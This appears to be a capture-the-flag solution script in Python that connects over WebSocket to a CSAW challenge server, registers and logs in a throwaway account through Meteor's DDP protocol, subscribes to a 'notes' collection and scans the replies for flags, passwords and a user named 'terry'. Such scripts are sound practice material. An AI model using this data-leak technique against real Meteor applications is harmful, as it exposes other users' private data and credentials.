import requests
import json
import random
import string
import time
from websocket import create_connection

def random_str(length=10):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def exploit_ddp():
    # Create WebSocket connection
    ws = create_connection("ws://web.chal.csaw.io:5000/sockjs/websocket")

    # Connect to DDP
    connect = {
        "msg": "connect",
        "version": "1",
        "support": ["1"]
    }
    ws.send(json.dumps(connect))
    print(ws.recv())

    # Create a test user
    username = f"test_{random_str()}"
    password = "test123"

    # Register user
    register = {
        "msg": "method",
        "method": "createUser",
        "params": [{
            "username": username,
            "password": password,
        }],
        "id": random_str()
    }
    ws.send(json.dumps(register))
    print(ws.recv())

    # Login
    login = {
        "msg": "method",
        "method": "login",
        "params": [{
            "user": {"username": username},
            "password": password
        }],
        "id": random_str()
    }
    ws.send(json.dumps(login))
    print(ws.recv())

    # Subscribe to notes collection
    sub = {
        "msg": "sub",
        "id": random_str(),
        "name": "notes"
    }
    ws.send(json.dumps(sub))

    # Wait for initial data
    while True:
        try:
            msg = ws.recv()
            print(f"Received: {msg}")

            # Look for sensitive data
            if any(keyword in msg.lower() for keyword in ['flag{', 'password', 'terry']):
                print("Found potential sensitive data!")

            if "added" in msg and "notes" in msg:
                print("Found notes data!")

        except Exception as e:
            print(f"Error: {e}")
            break

    ws.close()

if __name__ == "__main__":
    exploit_ddp()

